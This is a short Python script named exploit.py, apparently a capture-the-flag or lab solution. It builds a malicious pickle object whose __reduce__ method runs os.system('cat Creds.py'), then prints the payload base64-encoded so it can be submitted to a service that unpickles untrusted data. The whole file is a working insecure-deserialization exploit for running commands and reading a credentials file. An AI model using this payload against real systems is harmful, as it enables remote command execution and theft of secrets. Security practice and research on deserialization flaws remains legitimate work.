# exploit.py
import pickle, base64

class LeakAdmin(object):
    def __reduce__(self):
        import os
        # this command runs /bin/sh -c "<…>" 
        # Try to cat the file Creds.py directly
        # cmd = "ls"
        cmd = "cat Creds.py"
        return (os.system, (cmd,))

if __name__ == "__main__":
    p = pickle.dumps(LeakAdmin())
    print(base64.b64encode(p).decode())
